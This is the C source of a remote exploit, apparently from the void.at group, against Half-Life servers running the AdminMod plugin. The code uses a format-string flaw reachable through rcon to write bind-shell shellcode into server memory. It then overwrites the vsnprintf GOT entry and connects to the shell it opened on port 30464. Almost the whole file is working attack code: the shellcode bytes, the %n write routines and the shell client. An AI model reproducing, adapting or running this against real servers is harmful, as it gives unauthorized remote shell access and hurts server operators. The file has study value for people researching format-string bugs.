/*****************************************************************
  * hoagie_adminmod.c
  *
  * Remote exploit for Halflife-Servers running the Adminmod-Plugin
  * (rcon-password required)
  *
  * Binds a shell to port 30464/tcp and connects to it.
  *
  * Author: greuff@void.at
  *
  * Tested on HL-Server v3.1.1.0 and AdminMod 2.50.26a, 2.50.50
  *
  * Credits:
  *    void.at
  *    Taeho Oh for using parts of his shellcode-connection code.
  *
  * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
  * THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
  * CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
  *
  *****************************************************************/

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#define VSNPRINTF_GOT_ADDRESS 0x0804ce18
#define OFFSET 0x41414141

#define SB4(a) ((unsigned int)(a>>24))
#define SB3(a) ((unsigned int)((a>>16)&0xFF))
#define SB2(a) ((unsigned int)((a>>8)&0xFF))
#define SB1(a) ((unsigned int)(a&0XFF))

// forks and binds a shell to 30464/tcp. parent process exit()s.
char shellcode[] = "\x31\xc0\x40\x40\xcd\x80\x89\xc0\x85\xc0\x74\x06"
                    "\x31\xc0\xb0\x01\xcd\x80"
                    "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51"
                    "\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51\x8d\x0c\x24\xcd"
                    "\x80\xb3\x02\xb1\x02\x31\xc9\x51\x51\x51\x80\xc1\x77"
                    "\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24\xb2\x10\x52\x51"
                    "\x50\x8d\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80\xb3"
                    "\x01\x53\x52\x8d\x0c\x24\x31\xc0\xb0\x66\x80\xc3\x03"
                    "\xcd\x80\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05\xb0"
                    "\x66\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80"
                    "\x41\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd"
                    "\x80\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
                    "\x69\x89\xe3\x8d\x54\x24\x08\x31\xc9\x51\x53\x8d\x0c"
                    "\x24\x31\xc0\xb0\x0b\xcd\x80"
                    "\x31\xc0\xb0\x01\xcd\x80";

char server_ip[20];
char rcon_pwd[30];
int server_port;

int exec_sh(int sockfd)
{
         char snd[4096],rcv[4096];
         fd_set rset;
         while(1)
         {
                 FD_ZERO(&rset);
                 FD_SET(fileno(stdin),&rset);
                 FD_SET(sockfd,&rset);
                 select(255,&rset,NULL,NULL,NULL);
                 if(FD_ISSET(fileno(stdin),&rset))
                 {
                         memset(snd,0,sizeof(snd));
                         fgets(snd,sizeof(snd),stdin);
                         write(sockfd,snd,strlen(snd));
                 }
                 if(FD_ISSET(sockfd,&rset))
                 {
                         memset(rcv,0,sizeof(rcv));
                         if(read(sockfd,rcv,sizeof(rcv))<=0)
                                 exit(0);
                         fputs(rcv,stdout);
                 }
         }
}

int connect_sh()
{
         int sockfd,i;
         struct sockaddr_in sin;
         printf("Connect to the shell\n");
         fflush(stdout);
         memset(&sin,0,sizeof(sin));
         sin.sin_family=AF_INET;
         sin.sin_port=htons(30464);
         if(inet_aton(server_ip,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);
         if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
         {
                 printf("Can't create socket\n");
                 exit(0);
         }
         if(connect(sockfd,(struct sockaddr *)&sin,sizeof(sin))<0)
         {
                 printf("Can't connect to the shell\n");
                 exit(0);
         }
         return sockfd;
}

void create_conn(int *sock, char *host, int port)
{
    struct sockaddr_in sin;
    struct timeval timeout;

    sin.sin_family=AF_INET;
    sin.sin_port=htons(port);
    if(inet_aton(host,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);
    if((*sock=socket(PF_INET,SOCK_DGRAM,0))<0) perror("socket"), exit(1);

    timeout.tv_sec=10;
    timeout.tv_usec=0;
    if(setsockopt(*sock,SOL_SOCKET,SO_RCVTIMEO,(const void *)&timeout,
       sizeof(timeout))<0)
       perror("setsockopt"),exit(1);
    if(setsockopt(*sock,SOL_SOCKET,SO_SNDTIMEO,(const void *)&timeout,
       sizeof(timeout))<0)
       perror("setsockopt"),exit(1);
}

void lowlevel_rcon(int sock, char *host, int port, char *cmd, char *reply)
{
    char msg[2000];
    struct sockaddr_in sin;
    struct sockaddr_in sfrom;
    fd_set fdset;
    int dummy;

    usleep(100);

    sin.sin_family=AF_INET;
    sin.sin_port=htons(port);
    if(inet_aton(host,&(sin.sin_addr.s_addr))<0) perror("inet_aton"), exit(1);

    sprintf(msg,"%c%c%c%c%s",0xff,0xff,0xff,0xff,cmd);
    if(sendto(sock,msg,strlen(msg),0,(struct sockaddr *)&sin,sizeof(sin))<0)
       perror("sendto"), exit(1);

    if(reply)
    {
       if(recvfrom(sock,msg,2000,0,(struct sockaddr *)&sfrom,&dummy)<0)
       {
          if(errno==EAGAIN)
          {
             // resend message
             printf("msg stalled, resending...\n");
             sprintf(msg,"%c%c%c%c%s",0xff,0xff,0xff,0xff,cmd);
             if(sendto(sock,msg,strlen(msg),0,(struct sockaddr *)&sin,sizeof(sin))<0)
                perror("sendto"), exit(1);
             else
                printf("resend OK\n");
             if(recvfrom(sock,msg,2000,0,(struct sockaddr *)&sfrom,&dummy)<0)
                perror("recvfrom"),exit(1);
          }
          else
             perror("recvfrom"), exit(1);
       }

       if(strncmp(msg,"\xFF\xFF\xFF\xFF",4))
          fprintf(stderr,"protocol error: reply\n"), exit(1);

       strcpy(reply,msg+4);
    }
}

void send_rcon(int sock, char *host, int port, char *rconpwd, char *cmd, char *reply_fun)
{
    char reply[1000];
    char msg[2000];

    lowlevel_rcon(sock,host,port,"challenge rcon",reply);
    if(!strstr(reply,"challenge rcon "))
       fprintf(stderr,"protocol error\n"), exit(1);
    reply[strlen(reply)-1]=0;

    sprintf(msg,"rcon %s \"%s\" %s",reply+strlen("challenge rcon "),rconpwd,cmd);
    if(reply_fun)
       lowlevel_rcon(sock,host,port,msg,reply);
    else
       lowlevel_rcon(sock,host,port,msg,NULL);
    if(reply_fun)
       strcpy(reply_fun,reply);
}

int get_padding(unsigned char c,int bytes_written)
{
    int write_byte=c;
    int already_written=bytes_written;
    int padding;

    write_byte+=0x100;
    already_written%=0x100;
    padding=(write_byte-already_written)%0x100;
    if(padding<10) padding+=0x100;

    return padding;
}

void get_write_paddings(unsigned long addr, int *p1, int *p2, int *p3,
                         int *p4, int bytes_written)
{
    // greetings to scud :-)
    int write_byte;
    int already_written;
    int padding;

    write_byte=SB1(addr);
    already_written=bytes_written;
    write_byte+=0x100;
    already_written%=0x100;
    padding=(write_byte-already_written)%0x100;
    if(padding<10) padding+=0x100;
    *p1=padding;

    write_byte=SB2(addr);
    already_written+=padding;
    write_byte+=0x100;
    already_written%=0x100;
    padding=(write_byte-already_written)%0x100;
    if(padding<10) padding+=0x100;
    *p2=padding;

    write_byte=SB3(addr);
    already_written+=padding;
    write_byte+=0x100;
    already_written%=0x100;
    padding=(write_byte-already_written)%0x100;
    if(padding<10) padding+=0x100;
    *p3=padding;

    write_byte=SB4(addr);
    already_written+=padding;
    write_byte+=0x100;
    already_written%=0x100;
    padding=(write_byte-already_written)%0x100;
    if(padding<10) padding+=0x100;
    *p4=padding;
}

int main(int argc, char **argv)
{
    int sock, stackpops, padding;
    int i,j,bytes_written;
    int p1,p2,p3,p4;
    char cmd[1000], reply[1000];
    unsigned long addr;

    printf("hoagie_adminmod - remote exploit for hlds servers using the adminmod plugin\n"
           "by greuff@void.at\n\n");
    if(argc!=4)
    {
       printf("Usage: %s server_ip server_port rcon_password\n\n",argv[0]);
       exit(1);
    }

    strcpy(server_ip,argv[1]);
    server_port=strtol(argv[2],NULL,10);
    strcpy(rcon_pwd,argv[3]);

    create_conn(&sock,server_ip,server_port);

    printf("Getting stackpop count...");
    send_rcon(sock,server_ip,server_port,rcon_pwd,"log on",reply);
    stackpops=-1;
    for(padding=0;padding<4 && stackpops==-1;padding++)
    {
       for(i=1;i<100 && stackpops==-1;i++)

       {
          strcpy(cmd,"admin_command admin_map ");
          for(j=0;j<padding;j++) strcat(cmd,"b");
          sprintf(reply,"AAAA%%%d$08x",i);
          strcat(cmd,reply);

          send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,reply);
          reply[strlen(reply)-1]=0;
          if(strstr(reply,"AAAA41414141"))
          {
             stackpops=i;
            bytes_written=4+padding;
          }
          printf(".");
          fflush(stdout);
       }
    }
    padding--;
    if(stackpops==-1)
    {
       printf("\ncouldn't determine stackpop count. (I really tried hard!)\n");
       exit(1);
    }

    printf("\nStackpops found: %d, Padding: %d\n",stackpops,padding);

    // inject shellcode
    printf("Writing shellcode...");
    addr=OFFSET;
    for(i=0;i<strlen(shellcode);)
    {
       int t;
       if((addr&0xFF)>0x75)
       {
          // leave space for jmp-instruction (5 bytes: 0xe9 offset/32)
          // distance is 0x13B-0x7A = 193d
          unsigned long target=192;

          strcpy(cmd,"admin_command admin_map ");
          for(j=0;j<padding;j++) strcat(cmd,"b");
          t=get_padding(0xe9,bytes_written);
          sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
              (addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
          strcat(cmd,reply);
          send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,reply);

          addr++;
          strcpy(cmd,"admin_command admin_map ");
          for(j=0;j<padding;j++) strcat(cmd,"b");
          t=get_padding(target&0xFF,bytes_written);
          sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
              (addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
          strcat(cmd,reply);
          send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,reply);

          addr++;
          strcpy(cmd,"admin_command admin_map ");
          for(j=0;j<padding;j++) strcat(cmd,"b");
          t=get_padding((target>>8)&0xFF,bytes_written);
          sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
              (addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
          strcat(cmd,reply);
          send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,reply);

          addr++;
          strcpy(cmd,"admin_command admin_map ");
          for(j=0;j<padding;j++) strcat(cmd,"b");
          t=get_padding((target>>16)&0xFF,bytes_written);
          sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
              (addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
          strcat(cmd,reply);
          send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,reply);

          addr++;
          strcpy(cmd,"admin_command admin_map ");
          for(j=0;j<padding;j++) strcat(cmd,"b");
          t=get_padding((target>>24)&0xFF,bytes_written);
          sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
              (addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
          strcat(cmd,reply);
          send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,reply);

          addr+=193;
       }
       else
       {
          // write shellcode-pieces
          strcpy(cmd,"admin_command admin_map ");
          for(j=0;j<padding;j++) strcat(cmd,"b");
          t=get_padding(shellcode[i],bytes_written);
          sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
              (addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
          strcat(cmd,reply);
          send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,reply);
          addr++;
          i++;
       }
       printf(".");
       fflush(stdout);
    }

    // overwrite GOT entry with shellcode address
    strcpy(cmd,"admin_command admin_map ");
    for(j=0;j<padding;j++) strcat(cmd,"b");
    get_write_paddings(OFFSET,&p1,&p2,&p3,&p4,bytes_written+28);
    addr=VSNPRINTF_GOT_ADDRESS;
    sprintf(reply,"%c%c%c%cAAAA%c%c%c%cAAAA%c%c%c%cAAAA%c%c%c%cAAAA"
                  "%%%du%%%d$n%%%du%%%d$n%%%du%%%d$n%%%du%%%d$n",
                  addr&0xFF,(addr>>8)&0xFF,(addr>>16)&0xFF,(addr>>24)&0xFF,
                  (addr+1)&0xFF,((addr+1)>>8)&0xFF,((addr+1)>>16)&0xFF,((addr+1)>>24)&0xFF,
                  (addr+1)&0xFF,((addr+1)>>8)&0xFF,((addr+1)>>16)&0xFF,((addr+1)>>24)&0xFF,
                  (addr+2)&0xFF,((addr+2)>>8)&0xFF,((addr+2)>>16)&0xFF,((addr+2)>>24)&0xFF,
                  (addr+3)&0xFF,((addr+3)>>8)&0xFF,((addr+3)>>16)&0xFF,((addr+3)>>24)&0xFF,
                  p1,stackpops,p2,stackpops+2,p3,stackpops+4,p4,stackpops+6);
    strcat(cmd,reply);
    send_rcon(sock,server_ip,server_port,rcon_pwd,cmd,NULL);
    sleep(1);
    close(sock);
    printf("\nConnecting to the shell...\n");
    exec_sh(connect_sh());
    return 0;
}
